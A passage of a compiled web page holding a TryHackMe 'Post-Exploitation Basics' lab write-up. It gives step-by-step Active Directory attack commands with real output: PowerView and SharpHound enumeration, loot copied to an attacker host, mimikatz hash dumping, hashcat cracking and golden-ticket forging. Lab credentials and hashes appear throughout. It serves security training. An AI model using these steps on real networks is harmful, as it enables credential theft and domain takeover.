"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3526],{3905:(e,t,n)=>{n.d(t,{Zo:()=>m,kt:()=>h});var a=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function r(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):r(r({},t),e)),n},m=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},d="mdxType",c={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,i=e.originalType,s=e.parentName,m=l(e,["components","mdxType","originalType","parentName"]),d=p(n),u=o,h=d["".concat(s,".").concat(u)]||d[u]||c[u]||i;return n?a.createElement(h,r(r({ref:t},m),{},{components:n})):a.createElement(h,r({ref:t},m))}));function h(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var i=n.length,r=new Array(i);r[0]=u;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[d]="string"==typeof e?e:o,r[1]=l;for(var p=2;p<i;p++)r[p]=n[p];return a.createElement.apply(null,r)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},77122:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>r,default:()=>c,frontMatter:()=>i,metadata:()=>l,toc:()=>p});var a=n(87462),o=(n(67294),n(3905));const i={},r="Post-Exploitation Basics",l={unversionedId:"Tryhackme/Post-Exploitation Basics/Post Exploitation Basics",id:"Tryhackme/Post-Exploitation Basics/Post Exploitation Basics",title:"Post-Exploitation Basics",description:"Learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom",source:"@site/writeups/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics.md",sourceDirName:"Tryhackme/Post-Exploitation Basics",slug:"/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics",permalink:"/writeups/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Pickle Rick",permalink:"/writeups/Tryhackme/Pickle Rick/"},next:{title:"Poster",permalink:"/writeups/Tryhackme/Poster/"}},s={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Introduction",id:"introduction",level:2},{value:"Enumeration w/ Powerview",id:"enumeration-w-powerview",level:2},{value:"Enumeration w/ Bloodhound",id:"enumeration-w-bloodhound",level:2},{value:"Dumping hashes w/ mimikatz",id:"dumping-hashes-w-mimikatz",level:2},{value:"Golden Ticket Attacks w/ mimikatz",id:"golden-ticket-attacks-w-mimikatz",level:2},{value:"Enumeration w/ Server Manager",id:"enumeration-w-server-manager",level:2},{value:"Maintaining Access",id:"maintaining-access",level:2},{value:"Conclusion",id:"conclusion",level:2}],m={toc:p},d="wrapper";function c(e){let{components:t,...i}=e;return(0,o.kt)(d,(0,a.Z)({},m,i,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"post-exploitation-basics"},"Post-Exploitation Basics"),(0,o.kt)("p",null,"Learn the basics of post-exploitation and maintaining access with mimikatz, bloodhound, powerview and msfvenom"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/postexploit"},"Post-Exploitation Basics")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Windows Post-Exploitation Fundamentals")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"introduction"},"Introduction"),(0,o.kt)("p",null,"This room will cover all of the basics of post-exploitation; we'll talk everything from post-exploitation enumeration with powerview and bloodhound, dumping hashes and golden ticket attacks with mimikatz, basic information gathering using windows server tools and logs, and then we will wrap up this room talking about the basics of maintaining access with the persistence metaploit module and creating a backdoor into the machine to get an instant meterpreter shell if the system is ever shutdown or reset."),(0,o.kt)("p",null,"This room will be related to very real world applications and will most likely not help with any ctfs however this room will give you great starting knowledge of how to approach a network after you have gained a shell on a machine."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/xrdWrCV.png",alt:null})),(0,o.kt)("p",null,"To start this room deploy the machine and start the next section on enumerating with powerview."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"This Machine can take up to 10 minutes to boot and up to 10 minutes to ssh or rdp into the machine")),(0,o.kt)("p",null,"Deploy the Machine"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"enumeration-w-powerview"},"Enumeration w/ Powerview"),(0,o.kt)("p",null,"To start this room you will need to rdp or ssh into the machine your credentials are"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"user"),":Administrator"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"pass"),":P@$$W0rd"),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("strong",{parentName:"li"},"domain"),":controller.local")),(0,o.kt)("p",null,"Your machine IP is 10.10.102.37"),(0,o.kt)("p",null,"Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system."),(0,o.kt)("p",null,"We'll be focusing on how to start up and get users and groups from PowerView."),(0,o.kt)("p",null,"I have already taken the time and put PowerView on the machine"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Start Powershell - ",(0,o.kt)("inlineCode",{parentName:"li"},"powershell -ep bypass")," -ep bypasses the execution policy of powershell allowing you to easily run scripts",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/kVdteyd.png",alt:null})))),(0,o.kt)("li",{parentName:"ol"},"Start PowerView - ",(0,o.kt)("inlineCode",{parentName:"li"},". .\\Downloads\\PowerView.ps1")),(0,o.kt)("li",{parentName:"ol"},"Enumerate the domain users - ",(0,o.kt)("inlineCode",{parentName:"li"},"Get-NetUser | select cn"),(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/jXfVlgK.png",alt:null})))),(0,o.kt)("li",{parentName:"ol"},"Enumerate the domain groups - ",(0,o.kt)("inlineCode",{parentName:"li"},"Get-NetGroup -GroupName *admin*"),(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/37PiQa9.png",alt:null}))))),(0,o.kt)("p",null,"Now enumerate the domain further on your own"),(0,o.kt)("p",null,"Here's a cheatsheet to help you with commands: ",(0,o.kt)("a",{parentName:"p",href:"https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993"},"https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993")),(0,o.kt)("p",null,"Cheatsheet Credit: HarmJ0y"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"controller\\administrator@DOMAIN-CONTROLL C:\\Users\\Administrator>powershell -ep bypass\nPS> . .\\Downloads\\PowerView.ps1\n")),(0,o.kt)("p",null,"What is the shared folder that is not set by default?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PS C:\\Users\\Administrator> Invoke-ShareFinder\n\\\\Domain-Controller.CONTROLLER.local\\ADMIN$     - Remote Admin\n\\\\Domain-Controller.CONTROLLER.local\\C$         - Default share\n\\\\Domain-Controller.CONTROLLER.local\\IPC$       - Remote IPC\n\\\\Domain-Controller.CONTROLLER.local\\NETLOGON   - Logon server share\n\\\\Domain-Controller.CONTROLLER.local\\Share      -\n\\\\Domain-Controller.CONTROLLER.local\\SYSVOL     - Logon server share\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Share")),(0,o.kt)("p",null,"What operating system is running inside of the network besides Windows Server 2019?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PS C:\\Users\\Administrator> Get-NetComputer -fulldata | select operatingsystem\n\noperatingsystem\n---------------\nWindows Server 2019 Standard\nWindows 10 Enterprise Evaluation\nWindows 10 Enterprise Evaluation\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Windows 10 Enterprise Evaluation")),(0,o.kt)("p",null,"I've hidden a flag inside of the users find it"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PS C:\\Users\\Administrator> Get-NetUser | select cn\n\ncn\n--\nAdministrator\nGuest\nkrbtgt\nMachine-1\nAdmin2\nMachine-2\nSQL Service\nPOST{P0W3RV13W_FTW}\nsshd\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"POST{P0W3RV13W_FTW}")),(0,o.kt)("h2",{id:"enumeration-w-bloodhound"},"Enumeration w/ Bloodhound"),(0,o.kt)("p",null,"Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound."),(0,o.kt)("p",null,"Well be focusing on how to collect the .json files and how to import them into Bloodhound"),(0,o.kt)("p",null,"I have already taken the time to put SharpHound onto the machine"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/BAT2ZAH.png",alt:null})),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"BloodHound Installation -")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"apt-get install bloodhound")),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"neo4j console")," - default credentials -> neo4j:neo4j")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Getting loot w/ SharpHound -")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"powershell -ep bypass")," same as with PowerView"),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},". .\\Downloads\\SharpHound.ps1")),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip"),(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/Qv1Abv6.png",alt:null})))),(0,o.kt)("li",{parentName:"ol"},"Transfer the loot.zip folder to your Attacker Machine")),(0,o.kt)("p",null,"note: you can use scp to transfer the file if you\u2019re using ssh"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Mapping the network w/ BloodHound -")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"bloodhound")," Run this on your attacker machine not the victim machine"),(0,o.kt)("li",{parentName:"ol"},"Sign In using the same credentials you set with Neo4j",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/thfZUOy.png",alt:null})))),(0,o.kt)("li",{parentName:"ol"},"Inside of Bloodhound search for this icon ",(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/rXgtiuK.png",alt:null})," and import the loot.zip folder")),(0,o.kt)("p",null,"note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files"),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from.")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/4LSMKBX.png",alt:null})),(0,o.kt)("p",null,"The queries can be as simple as find all domain admins -"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/Eced2zF.png",alt:null})),(0,o.kt)("p",null,"Or as complicated as shortest path to high value targets -"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/1orYd9p.png",alt:null})),(0,o.kt)("p",null,"There are plenty of queries to choose from and enumerate connections inside of the network"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PS C:\\Users\\Administrator> . .\\Downloads\\SharpHound.ps1\nPS C:\\Users\\Administrator> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -Zip\nFileName loot.zip\n------------------------------------------------\nResolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container\nCompressing data to C:\\Users\\Administrator\\20201120142947_loot.zip\nYou can upload this file directly to the UI\n\nSharpHound Enumeration Completed at 2:29 PM on 11/20/2020! Happy Graphing!\n\nPS C:\\Users\\Administrator> scp -o StrictHostKeyChecking=no .\\20201120142947_loot.zip kali@10.8.106.222:/home/kali/CTFs/tryhackme\nWarning: Permanently added '10.8.106.222' (ECDSA) to the list of known hosts.\nkali@10.8.106.222's password:\n20201120142947_loot.zip                                                                                                             100% 9507   297.1KB/s   00:00\n")),(0,o.kt)("p",null,"What service is also a domain admin"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SQLSERVICE")),(0,o.kt)("p",null,"What two users are Kerberoastable?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"KRBTGT@CONTROLLER.LOCAL\npwdlastset: Thu, 14 May 2020 03:14:47 GMT\n\nSQLSERVICE@CONTROLLER.LOCAL\npwdlastset: Thu, 14 May 2020 03:26:58 GMT\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SQLSERVICE, KRBTGT")),(0,o.kt)("h2",{id:"dumping-hashes-w-mimikatz"},"Dumping hashes w/ mimikatz"),(0,o.kt)("p",null,"Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network"),(0,o.kt)("p",null,"We'll be focusing on dumping the NTLM hashes with mimikatz and then cracking those hashes using hashcat"),(0,o.kt)("p",null,"I have already taken the time to put mimikatz on the machine"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Dump Hashes w/ mimikatz -")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"cd Downloads && mimikatz.exe")," this will cd into the directory that mimikatz is kept as well as run the mimikatz binary",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/qwNK9te.png",alt:null})))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"privilege::debug")," ensure that the output is \"Privilege '20' ok\" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/aZjIrU7.png",alt:null})))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"lsadump::lsa /patch")," Dump those hashes!",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/6KnPn03.png",alt:null}))))),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Crack those hashes w/ hashcat")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"hashcat -m 1000 <hash> rockyou.txt"))),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/ihEcxFA.png",alt:null})),(0,o.kt)("p",null,"Mimikatz has many uses along side being a great tool to dump hashes we will cover another one of those ways of using mimikatz in the next task by creating a golden ticket with mimikatz"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PS C:\\Users\\Administrator> cd Downloads\nPS C:\\Users\\Administrator\\Downloads> . .\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # lsadump::lsa /patch\nDomain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166\n\nRID  : 000001f4 (500)\nUser : Administrator\nLM   :\nNTLM : 2777b7fec870e04dda00cd7260f7bee6\n\nRID  : 000001f5 (501)\nUser : Guest\nLM   :\nNTLM :\n\nRID  : 000001f6 (502)\nUser : krbtgt\nLM   :\nNTLM : 5508500012cc005cf7082a9a89ebdfdf\n\nRID  : 0000044f (1103)\nUser : Machine1\nLM   :\nNTLM : 64f12cddaa88057e06a81b54e73b949b\n\nRID  : 00000451 (1105)\nUser : Admin2\nLM   :\nNTLM : 2b576acbe6bcfda7294d6bd18041b8fe\n\nRID  : 00000452 (1106)\nUser : Machine2\nLM   :\nNTLM : c39f2beb3d2ec06a62cb887fb391dee0\n\nRID  : 00000453 (1107)\nUser : SQLService\nLM   :\nNTLM : f4ab68f27303bcb4024650d8fc5f973a\n\nRID  : 00000454 (1108)\nUser : POST\nLM   :\nNTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2\n\nRID  : 00000457 (1111)\nUser : sshd\nLM   :\nNTLM : 2777b7fec870e04dda00cd7260f7bee6\n\nRID  : 000003e8 (1000)\nUser : DOMAIN-CONTROLL$\nLM   :\nNTLM : 4bd04581d16353e6bf64ba9745cb6a8f\n\nRID  : 00000455 (1109)\nUser : DESKTOP-2$\nLM   :\nNTLM : 3c2d4759eb9884d7a935fe71a8e0f54c\n\nRID  : 00000456 (1110)\nUser : DESKTOP-1$\nLM   :\nNTLM : 7d33346eeb11a4f12a6c201faaa0d89a\n")),(0,o.kt)("p",null,"what is the Machine1 Password?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Post-Exploitation Basics$ hashcat -m 1000 Machine1.hash /usr/share/wordlists/rockyou.txt --force\nhashcat (v5.1.0) starting...\n\nOpenCL Platform #1: The pocl project\n====================================\n* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 1024/3023 MB allocatable, 4MCU\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers:\n* Zero-Byte\n* Early-Skip\n* Not-Salted\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n* Raw-Hash\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nATTENTION! Pure (unoptimized) OpenCL kernels selected.\nThis enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.\nIf you want to switch to optimized OpenCL kernels, append -O to your commandline.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\n* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=1000 -D _unroll'\n* Device #1: Kernel m01000_a0-pure.577ef21e.kernel not found in cache! Building may take a while...\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n64f12cddaa88057e06a81b54e73b949b:Password1\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: NTLM\nHash.Target......: 64f12cddaa88057e06a81b54e73b949b\nTime.Started.....: Fri Nov 20 23:51:46 2020 (0 secs)\nTime.Estimated...: Fri Nov 20 23:51:46 2020 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    11926 H/s (0.52ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 4096/14344385 (0.03%)\nRejected.........: 0/4096 (0.00%)\nRestore.Point....: 0/14344385 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: 123456 -> oooooo\n\nStarted: Fri Nov 20 23:51:09 2020\nStopped: Fri Nov 20 23:51:48 2020\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Password1")),(0,o.kt)("p",null,"What is the Machine2 Hash?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"c39f2beb3d2ec06a62cb887fb391dee0")),(0,o.kt)("h2",{id:"golden-ticket-attacks-w-mimikatz"},"Golden Ticket Attacks w/ mimikatz"),(0,o.kt)("p",null,"Again using the same tool as the previous task; however, this time we'll be using it to create a golden ticket."),(0,o.kt)("p",null,"We will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network."),(0,o.kt)("p",null,"I have already taken the time to put mimikatz on the machine."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Dump the krbtgt Hash -")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"cd downloads && mimikatz.exe")),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"privilege::debug")," ensure this outputs ",'[privilege "20" ok]'),(0,o.kt)("li",{parentName:"ol"},"l",(0,o.kt)("inlineCode",{parentName:"li"},"sadump::lsa /inject /name:krbtgt")," This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/Yzq71aI.png",alt:null})),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Take note of what is outlined in red you'll need it to create the golden ticket")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Create a Golden Ticket -")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"kerberos::golden /user: /domain: /sid: /krbtgt: /id:"))),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/9ZIN20L.png",alt:null})),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Use the Golden Ticket to access other machine -")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"misc::cmd")," - This will open a new command prompt with elevated privileges to all machines",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/iB0Io20.png",alt:null})))),(0,o.kt)("li",{parentName:"ol"},"Access other Machines! - You will now have another command prompt with access to all other machines on the network",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/BYSud9C.png",alt:null})),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/tp3N9gt.png",alt:null}))))),(0,o.kt)("p",null,"Unfortunately because tryhackme does not currently support networks you will be unable to access other machines however I encourage you to add other machines to this domain controller yourself and try out these attacks"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"mimikatz # lsadump::lsa /inject /name:krbtgt\nDomain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166\n\nRID  : 000001f6 (502)\nUser : krbtgt\n\n * Primary\n    NTLM : 5508500012cc005cf7082a9a89ebdfdf\n    LM   :\n  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf\n    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf\n    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c\n\n * WDigest\n    01  49a8de3b6c7ae1ddf36aa868e68cd9ea\n    02  7902703149b131c57e5253fd9ea710d0\n    03  71288a6388fb28088a434d3705cc6f2a\n    04  49a8de3b6c7ae1ddf36aa868e68cd9ea\n    05  7902703149b131c57e5253fd9ea710d0\n    06  df5ad3cc1ff643663d85dabc81432a81\n    07  49a8de3b6c7ae1ddf36aa868e68cd9ea\n    08  a489809bd0f8e525f450fac01ea2054b\n    09  19e54fd00868c3b0b35b5e0926934c99\n    10  4462ea84c5537142029ea1b354cd25fa\n    11  6773fcbf03fd29e51720f2c5087cb81c\n    12  19e54fd00868c3b0b35b5e0926934c99\n    13  52902abbeec1f1d3b46a7bd5adab3b57\n    14  6773fcbf03fd29e51720f2c5087cb81c\n    15  8f2593c344922717d05d537487a1336d\n    16  49c009813995b032cc1f1a181eaadee4\n    17  8552f561e937ad7c13a0dca4e9b0b25a\n    18  cc18f1d9a1f4d28b58a063f69fa54f27\n    19  12ae8a0629634a31aa63d6f422a14953\n    20  b6392b0471c53dd2379dcc570816ba10\n    21  7ab113cb39aa4be369710f6926b68094\n    22  7ab113cb39aa4be369710f6926b68094\n    23  e38f8bc728b21b85602231dba189c5be\n    24  4700657dde6382cd7b990fb042b00f9e\n    25  8f46d9db219cbd64fb61ba4fdb1c9ba7\n    26  36b6a21f031bf361ce38d4d8ad39ee0f\n    27  e69385ee50f9d3e105f50c61c53e718e\n    28  ca006400aefe845da46b137b5b50f371\n    29  15a607251e3a2973a843e09c008c32e3\n\n * Kerberos\n    Default Salt : CONTROLLER.LOCALkrbtgt\n    Credentials\n      des_cbc_md5       : 64ef5d43922f3b5d\n\n * Kerberos-Newer-Keys\n    Default Salt : CONTROLLER.LOCALkrbtgt\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d\n      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066\n      des_cbc_md5       (4096) : 64ef5d43922f3b5d\n\n * NTLM-Strong-NTOWF\n    Random Value : 666caaaaf30081f30211bd7fa445fec4\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdf\ndf /id:500\nUser      : Administrator\nDomain    : controller.local (CONTROLLER)\nSID       : S-1-5-21-849420856-2351964222-986696166\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt\nLifetime  : 11/20/2020 2:57:52 PM ; 11/18/2030 2:57:52 PM ; 11/18/2030 2:57:52 PM\n-> Ticket : ticket.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n\nmimikatz # misc::cmd\nPatch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7874243B8\n")),(0,o.kt)("p",null,"I understand how a golden ticket attack works and how to use a golden ticket attack to move through a network"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"enumeration-w-server-manager"},"Enumeration w/ Server Manager"),(0,o.kt)("p",null,"Because servers are hardly ever logged on unless its for maintenance this gives you an easy way for enumeration only using the built in windows features such as the server manager. If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing."),(0,o.kt)("p",null,"The only way to access the server manager is to rdp into the server and access the server over an rdp connection"),(0,o.kt)("p",null,"We'll only be going over the basics such as looking at users, groups, and trusts however there are 